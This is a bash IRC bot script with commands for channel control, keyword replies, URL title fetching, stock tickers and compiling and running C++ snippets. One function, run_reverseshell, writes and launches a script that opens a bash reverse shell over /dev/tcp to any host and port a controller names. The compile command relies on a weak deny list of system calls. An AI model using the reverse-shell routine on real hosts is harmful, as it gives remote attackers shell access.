#!/bin/bash

authenticated(){
  SENDER=$1
  RESPOND=$2
  RETURN=$3

  FOUND="false"

  for controller in "${ALLOWED_PM_CONTROLLERS[@]}"; do
    if [ $controller == $SENDER ]; then
       FOUND="true"
    fi
  done

  [ "$FOUND" == "false" ] && message_post $RESPOND "Sorry - you are not a controller" && eval $RETURN=0 && return

  eval $RETURN=1
}

message_post(){
  DESTINATION=$1
  shift
  echo "PRIVMSG $DESTINATION :$*"
}

run_ping(){

  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to ping - you are not a controller" && return

  [ ! -e /bin/ping ] && message_post $1 "No ping utility installed" && return
  [ ! -e /bin/grep ] && message_post $1 "No grep utility installed" && return

  [ ! "$3" ] && message_post $1 "Must supply a host to ping" && return

  message_post $1 "Sending ping to [ $3 ]"

  RESULT=$(/bin/ping -c 1 "$3" | /bin/grep "received")

  message_post $1 "Result [ $RESULT ]"
}

run_join(){
  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to join - you are not a controller" && return

  [ ! "$3" ] && message_post $1 "Need to specify a room to join" && return
  [ ! "${3:0:1}" == "#" ] && message_post $1 "Room name [ $3 ] seems bad" && return

  echo "JOIN $3"
  message_post $1 "Attempted to join room"
}

run_part(){
  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to part - you are not a controller" && return

  [ ! "$3" ] && message_post $1 "Need to specify a room to leave" && return
  [ ! "${3:0:1}" == "#" ] && message_post $1 "Room name [ $3 ] seems bad" && return

  echo "PART $3"
  message_post $1 "Attempted to leave room"
}

run_nick(){
  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change nick - you are not a controller" && return

  [ ! "$3" ] && message_post $1 "Need to specify a new nick" && return
  [ "${3:0:1}" == "#" ] && message_post $1 "Nick [ $3 ] seems bad" && return

  nick="$3"

  echo "NICK $3"
  message_post $1 "Changed nick"
}

run_speak(){

  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable - you are not a controller" && return

  [ ! "$3" ] && message_post $1 "Need to give me a target" && return
  [ $# -lt 4 ] && message_post $1 "Need to give me something to say" && return

  SENDER="$1"
  DEST="$3"
 
  shift 3

  message_post $SENDER "Okay"
  message_post $DEST "$*"

}

run_quit(){
  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to quit - you are not a controller" && return

  message_post $1 "Okay, bye"
  
  shift 2
  echo "QUIT $*"
  sleep 1
  exit 0
}

run_resolve(){
   MATCH=$(echo "$*" | /bin/grep -o -E "(http|https)(:[/][/])([a-z]|[A-Z]|[0-9]|[/=]|[/?]|[&]|[/-]|[/.]|[~])*" 2>/dev/null)

   if [ $? -eq 0 -a "$MATCH" ]; then
      # first resolve the url
      #echo "MATCHED: $MATCH"
      RESULT=$(curl -L "$MATCH" 2>/dev/null)
      echo "$RESULT"
   fi
}

run_reverseshell(){

  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to join - you are not a controller" && return

  [ $ALLOW_REVERSE_SHELL -eq 0 ] && message_post $1 "No reverse shell" && return

  [ ! -x /bin/cat ] && message_post $1 "No cat binary" && return
  [ ! -x /usr/bin/nohup ] && message_post $1 "No nohup" && return
  [ ! -x /bin/chmod ] && message_post $1 "No chmod binary" && return
  [ ! -x /bin/rm ] && message_post $1 "No rm binary" && return

  [ ! "$3" ] && message_post $1 "Must specify a host" && return
  [ ! "$4" ] && message_post $1 "Must specify a port" && return

  message_post $1 "Spawning a forked reverse shell to [$3:$4]..."

  TMPSHELL=$(/bin/mktemp)

  #[ -e $TMP ] && /bin/rm -f /tmp/makeshell

  message_post $1 "Writing a makeshell shell script"
  /bin/cat > $TMPSHELL <<EOF
#!/bin/bash
exec 3<> /dev/tcp/$3/$4
if [ $? != 0 ]; then
   exit 0
fi
/bin/bash 0<&3 1>&3- 2>/dev/null 
rm -f $TMPSHELL
EOF
  /bin/chmod +x $TMPSHELL

  [ ! -x $TMPSHELL ] && message_post $1 "Cannot make shell - failed" && rm -f $TMPSHELL && return
  
  $(/usr/bin/nohup $TMPSHELL $3 $4 >/dev/null </dev/null 2>/dev/null &)
  message_post $1 "Spawned"
}

run_keyword(){
  [ ! "$3" ] && message_post $1 "Please say one of (off|on|clear|add|del)" && return

  #message_post $1 "Attempting to modify keyword stuff ${USE_KEYWORDS} ${#KEYWORDS[*]} "

  if [ "$3" == "off" ]; then

    authenticated $1 $2 RESULT
    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return
    message_post $2 "Use keywords off"
    USE_KEYWORDS="0"
  elif [ "$3" == "on" ]; then
    authenticated $1 $2 RESULT
    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return

    message_post $2 "Use keywords on"
    USE_KEYWORDS="1"
  elif [ "$3" == "clear" ]; then
    authenticated $1 $2 RESULT
    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return

    KEYWORDS=()
    KEYWORD_RESPONSES=()
  elif [ "$3" == "add" ]; then
    [ ! "$4" ] && message_post $1 "Requires a word" && return
    [ ! "$5" ] && message_post $1 "Requries at least a one word response" && return
   
    SENDER=$2
    shift 3
    KW=$1
    KEYWORDS=("${KEYWORDS[@]}" "$1")
    shift 1
    RSP="$*"
    KEYWORD_RESPONSES=("${KEYWORD_RESPONSES[@]}" "$*")

    message_post $SENDER "Added [ $KW ] with [ $RSP ]"
  elif [ "$3" == "list" ]; then
    [ ! "$4" ] && message_post $1 "Give me a keyword" && return
    I=0
    for found in "${KEYWORDS[@]}"; do
      result=$(echo "$*" | /bin/grep -i "$found")
      if [ "${result}" ]; then
        message_post $2 "Keyword [ ${KEYWORDS[${I}]} ] is [ ${KEYWORD_RESPONSES[$I]} ]"
        return
      fi
      ((I=$I+1))
    done

  elif [ "$3" == "del" ]; then
    authenticated $1 $2 RESULT
    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return
    I=0
    for found in "${KEYWORDS[@]}"; do
      result=$(echo "$*" | /bin/grep -i "$found")
      if [ "${result}" ]; then
          KEYWORDS=(${KEYWORDS[@]:0:$I} ${KEYWORDS[@]:$(($I + 1))})
          KEYWORD_RESPONSES=(${KEYWORD_RESPONSES[@]:0:$I} ${KEYWORD_RESPONSES[@]:$(($I + 1))})
          message_post $2 "Removed keyword [ $found ]"
          return
      fi
      (( I=$I+1 ))
    done
  fi

}

run_shorten(){
   [ ! "$3" ] && message_post $2 "Unable to shorten blank url" && return

   URL="http://is.gd/api.php?longurl=$3"
   RESULT=$(/usr/bin/curl $URL)
   message_post $2 "Shortened [ $RESULT ]"
}

run_controller(){

  SENDER=$1
  RESPOND=$2

  [ ! "$3" ] && message_post $RESPOND "Please say one of (list|add|del)" && return

  if [ "$3" == "list" ]; then
    message_post $RESPOND "Bot Controllers [ ${ALLOWED_PM_CONTROLLERS[@]} ]"
  elif [ "$3" == "add" ]; then
    [ ! "$4" ] && message_post $RESPOND "Must give a name" && return

    authenticated $1 $2 RESULT
    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return

    ALLOWED_PM_CONTROLLERS=(${ALLOWED_PM_CONTROLLERS[@]} "$4")
    message_post $RESPOND "Added - [ $4 ]"
  elif [ "$3" == "del" ]; then
    [ ! "$4" ] && message_post $RESPOND "Must give a name" && return

    authenticated $1 $2 RESULT
    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return

    I=0
    for found in "${ALLOWED_PM_CONTROLLERS[@]}"; do
      if [ "$found" == "$4" ]; then
        ALLOWED_PM_CONTROLLERS=(${ALLOWED_PM_CONTROLLERS[@]:0:${I}} ${ALLOWED_PM_CONTROLLERS[@]:$(($I + 1))})
      fi
      (( I=$I+1 ))
    done
  else
      message_post $RESPOND "Please say one of (list|add|del)"    
  fi
}

run_ticker(){
  SENDER=$1
  CHANNEL=$2
  shift 2

  [ ! "$1" ] && message_post $CHANNEL "Requires a ticker symbol"
  TICKERNAME=$(wget -O- "http://finance.yahoo.com/q?s=${1}&ql=1" 2>/dev/null | grep time_rtq_ticker | cut -d\" -f17 | cut -d"<" -f2 | cut -d">" -f2)
  TICKERPRICE=$(wget -O- "http://finance.yahoo.com/q?s=${1}&ql=1" 2>/dev/null | grep time_rtq_ticker | cut -d\" -f27 | cut -d"<" -f1 | cut -d">" -f2)

  message_post $CHANNEL "Ticker [ ${TICKERNAME} ] value [ ${TICKERPRICE} ]"
}

run_emote(){
  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return


  [ ! "$3" ] && message_post $1 "Need to give me a dest to emote" && return
  [ $# -lt 4 ] && message_post $1 "Need to give me something to emote" && return

  SENDER="$1"
  DEST="$3"
  
  shift 3
  message_post $SENDER "Okay"
  echo -e "PRIVMSG $DEST :\001ACTION $*\001"
}

run_compile(){

  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Sorry, ${1}, but you are not authorized to compile" && return

  SENDER=$1
  RESPONSE=$2

  shift 2

  [ ! "$*" ] && message_post $RESPONSE "Error - no shit to compile"

  HASMAIN=$(echo "$*" | /bin/grep -w -E "main")

  BADWORDS=( "socket" "setuid" "setgid" "seteuid" "setegid" "fopen" "open" "creat" "system" "exec" "execl" "execvp" "execp" "execle" "ioctl" "asm" "fork" "vfork" "clone" "execve" "signal" "kill" )

  for badword in "${BADWORDS[@]}"; do
    HASWORD=$(echo "$*" | /bin/grep -w -o "$badword")
    if [ "${HASWORD}" ]; then
      message_post $RESPONSE "Sorry, ${SENDER}, but you used a bad word: [ $badword ]"
      return
    fi
  done
  

  COUTFILE=$(/bin/mktemp --suffix=.cc)
  AOUTFILE=$(/bin/mktemp)
  WARNFIL=$(/bin/mktemp)

  cat > $COUTFILE <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <pthread.h>
#include <iostream>
#include <vector>
#include <map>
#include <valarray>
#include <string>
#include <iomanip>
#include <algorithm>
#include <list>
#include <set>
#include <sstream>
#include <fstream>
#include <stack>

using namespace std;

EOF

  if [ ! "$HASMAIN" ]; then
      cat >> $COUTFILE <<EOF

int main()
EOF

      [ "${1:0:1}" != "{" ] && $(echo "{" >> $COUTFILE)
  fi

  $(printf '%s' "$*" >> $COUTFILE)

  ERRORS=$(/usr/bin/g++ -Wall -o $AOUTFILE $COUTFILE 2>$WARNFIL)

  if [ -s "$WARNFIL" ]; then
    LINES_OF_WARNING_ERROR=$(/bin/wc -l $WARNFIL)
    message_post $RESPONSE "Generated warnings/errors [ $ERRORS ]"

#    /bin/rm -f $COUTFILE $AOUTFILE $WARNFIL
    return
  fi
  /bin/chmod +x $WARNFIL

  /bin/cat >$WARNFIL <<EOF
#!/bin/bash
ulimit -t 2
ulimit -u 5
$AOUTFILE
EOF

  /bin/chmod +x $WARNFIL

  RESULT=$( ${WARNFIL} 2>&1 )
 
  /bin/rm -f ${WARNFIL} ${AOUTFILE} ${COUTFILE}

  message_post $RESPONSE "Result is [ $RESULT ]"
}

run_mycmd(){

  SENDER="$1"
  RESPOND="$1"
  KW="$2"

  shift 2

  if [ "$KW" == "uptime" ]; then
    [ ! -e /usr/bin/uptime ] && message_post $SENDER "Sorry - no uptime binary" && return
    UPTIME=$(/usr/bin/uptime)
    message_post $SENDER "Uptime - $UPTIME"
  elif [ "$KW" == "sysinfo" ]; then
    [ ! -e /bin/uname ] && message_post $SENDER "No uname binary found" && return
    UNAME=$(/bin/uname -a)
    message_post $SENDER "Uname - $UNAME"
  elif [ "$KW" == "id" ]; then
    [ ! -e /usr/bin/id ] && message_post $SENDER "No id binary" && return
    IDINFO=$(/usr/bin/id)
    message_post $SENDER "ID [ $IDINFO ]"
  elif [ "$KW" == "keywords" ]; then
    message_post $SENDER "Keywords [ ${KEYWORDS[@]} ]"
  elif [ "$KW" == "ping" ]; then
    run_ping $SENDER $RESPOND $*
  elif [ "$KW" == "rshell" ]; then
    run_reverseshell $SENDER $RESPOND $*
  elif [ "$KW" == "nick" ]; then
    run_nick $SENDER $RESPOND $*
  elif [ "$KW" == "join" ]; then
    run_join $SENDER $RESPOND $*
  elif [ "$KW" == "part" ]; then
    run_part $SENDER $RESPOND $*
  elif [ "$KW" == "speak" ]; then
    run_speak $SENDER $RESPOND $*
  elif [ "$KW" == "emote" ]; then
    run_emote $SENDER $RESPOND $*
  elif [ "$KW" == "keyword" ]; then
    run_keyword $SENDER $RESPOND $*
  elif [ "$KW" == "controller" ]; then
    run_controller $SENDER $RESPOND $*
  elif [ "$KW" == "ticker" ]; then
    run_ticker $SENDER $RESPOND $*
  elif [ "$KW" == "shorten" ]; then
    run_shorten $SENDER $SENDER $*
  elif [ "$KW" == "quit" ]; then
    run_quit $SENDER $RESPOND "$*"
  else
    message_post $SENDER "Unknown command: [$KW]"
  fi

  return
}

handler_callback_tome(){
  debug "tome ARGS: $*"

  SENDER="$1"

  ACTION="${2:1}"

  shift 2

  if [ "${ACTION:0:1}" == \! ]; then
     run_mycmd $SENDER "${ACTION:1}" $*
  else
     message_post $1 "Unable to recognize your request [$*]"
  fi

  return
}


#############################################################################
##
## CHANNEL
##
#############################################################################


handler_callback_tochan(){
  debug "TOCHAN ARGS: $*"

  SENDER="$1"
  CHANNEL="$2"

  shift 2

  if [ "${1:1:1}" == \! ]; then
    if [ "${1:2}" == "uptime" ]; then
      UPTIME=$(/usr/bin/uptime)
      message_post $CHANNEL "$UPTIME"
    elif [ "${1:2}" == "explode" ]; then
      [ ! "$2" ] && message_post $CHANNEL "Explode requires a URL dumbass" && return
      URL=$(curl -I -s "$2" | fgrep 'Location:' | cut -d" " -f2)
      message_post $CHANNEL "Exploded url: $URL "
    elif [ "${1:2}" == "keywords" ]; then
      message_post $CHANNEL "Recognized keywords [ ${KEYWORDS[@]} ]"
    elif [ "${1:2}" == "keyword" ]; then
      shift
      run_keyword $SENDER $CHANNEL $*
    elif [ "${1:2}" == "ticker" ]; then
      shift
      run_ticker $SENDER $CHANNEL $*
    elif [ "${1:2}" == "controller" ]; then
      shift
      run_controller $SENDER $CHANNEL $*
    elif [ "${1:2}" == "shorten" ]; then
      shift
      run_shorten $SENDER $CHANNEL $*
    elif [ "${1:2}" == "join" ]; then
      shift
      run_join $SENDER $CHANNEL $*
    elif [ "${1:2}" == "compile" ]; then
      shift
      run_compile $SENDER $CHANNEL $*
    elif [ "${1:2}" == "quit" ]; then
      shift
      run_quit $SENDER $CHANNEL "$*"
    fi
#    else
#        message_post $SENDER "Channel command [ ${1:2} ] not supported"
    fi

    return
  fi

  if [ "${USE_KEYWORDS}" == "1" ]; then
      I=0
      for found in "${KEYWORDS[@]}"; do
        result=$(echo "$*" | /bin/grep -i "$found")
        if [ "${result}" ]; then
            RESPONSE="${KEYWORD_RESPONSES[${I}]}"
            SEDLINE="s/%SENDER%/${SENDER}/g"
            FORMATTED_RSP=$(echo "$RESPONSE" | /bin/sed $SEDLINE)
  
            check_title=$(echo "$FORMATTED_RSP" | /bin/grep "%URL_TITLE%")
            if [ "$check_title" ]; then
               HTTP_TEXT=$(run_resolve "$*")
               TITLE=$(echo "${HTTP_TEXT}" | /bin/grep -o "<title>.*</title>" | /bin/sed "s@<title>@@g" | /bin/sed "s@</title>@@g" )
               debug "$SENDER asked for $TITLE from $*"
               if [ "$TITLE" ]; then
                  SEDLINE="s@%URL_TITLE%@$TITLE@g"
                  FORMATTED_RSP=$(echo "$FORMATTED_RSP" | /bin/sed "${SEDLINE}")
               else
                  SEDLINE="s@%URL_TITLE%@(No Title)@g"
                  FORMATTED_RSP=$(echo "$FORMATTED_RSP" | /bin/sed "${SEDLINE}")
               fi
            fi

            message_post $CHANNEL "${FORMATTED_RSP}"
            return
        fi
        (( I=$I+1 ))
      done
  fi
}
